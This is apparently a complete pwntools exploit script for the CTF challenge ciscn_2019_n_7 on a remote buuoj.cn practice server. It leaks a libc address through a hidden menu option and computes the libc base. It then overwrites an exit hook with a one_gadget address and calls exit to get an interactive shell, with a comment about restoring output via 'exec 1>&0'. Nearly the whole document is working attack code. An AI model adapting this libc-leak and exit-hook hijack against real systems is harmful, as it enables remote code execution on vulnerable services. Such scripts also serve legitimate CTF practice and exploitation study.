from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./ciscn_2019_n_7"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 25519)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, name):
    sa("Your choice-> \n", str(1))
    sa("Input string Length: \n", str(size))
    sa("Author name:\n", name)

def edit(name, con):
    sa("Your choice-> \n", str(2))
    sa("New Author name:\n", name)
    sa("New contents:\n", con)

def show():
    sa("Your choice-> \n", str(3))

def exit():
    sa("Your choice-> \n", str(4))

def back():
    sa("Your choice-> \n", str(666))


# leak
back()
info = int(rud("\n"), 16)
libc = ELF(libc_path)
base = info-libc.sym["puts"]
print("base: ", hex(base))

# write exit_hook to one_gadget
oneshot = base+0xf1147

add(0x10, cyclic(0x10))
exit_hook = base+0x5f0040+3848
edit(cyclic(0x8)+p64(exit_hook), p64(oneshot))

# attack
exit()

# bacause close(0) and close(1), use "exec 1>&0"
shell()


